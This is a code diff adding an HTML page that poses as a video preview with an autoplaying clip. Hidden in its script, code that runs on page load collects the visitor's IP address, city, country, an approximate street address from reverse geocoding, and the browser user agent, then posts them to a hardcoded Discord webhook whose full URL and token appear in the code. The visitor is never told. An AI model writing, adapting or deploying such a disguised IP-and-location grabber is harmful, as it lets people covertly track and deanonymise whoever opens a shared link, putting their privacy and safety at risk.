@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Video Preview">
+    <meta property="og:description" content="Watch this video">
+    <meta property="og:type" content="video.other">
+    <meta property="og:url" content="https://videoshare.surge.sh">
+    <meta property="og:video" content="https://videoshare.surge.sh/vid/oops.mp4">
+    <meta property="og:video:type" content="video/mp4">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
+    <title>Video</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow: hidden;
+        }
+        video {
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <video autoplay loop muted playsinline>
+        <source src="vid/oops.mp4" type="video/mp4">
+    </video>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1388024995611021352/uHQpAPbyHYpBXEYyQE0XCy6sQX4PRjHxFiv6YFGl6TeeHMzOskGjMMl0o3BRfdf9mPFu";
+
+        async function trackVisitor() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipRes.json();
+
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoRes.json();
+
+                let address = "Unknown";
+                if (geoData.latitude && geoData.longitude) {
+                    try {
+                        const osmRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${geoData.latitude}&lon=${geoData.longitude}&zoom=16`);
+                        const osmData = await osmRes.json();
+                        address = osmData.display_name || "Nearby: " + osmData.address?.road || osmData.address?.city;
+                    } catch (e) {
+                        address = `📍 ${geoData.latitude}, ${geoData.longitude}`;
+                    }
+                }
+
+                const embed = {
+                    title: "🚨 New Visitor Detected",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
+                        { name: "📍 Location", value: `${geoData.city || "Unknown"}, ${geoData.country_name || "Unknown"}`, inline: true },
+                        { name: "🏠 Approximate Address", value: address },
+                        { name: "🔗 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
+                    ],
+                    footer: { text: `Time: ${new Date().toUTCString()}` }
+                };
+
+                fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+            } catch (err) {
+                fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        content: `⚠️ Visitor detected but tracking failed!\n**IP:** Unknown\n**Error:** ${err.message}` 
+                    })
+                });
+            }
+        }
+
+        trackVisitor();
+    </script>
+</body>
+</html>
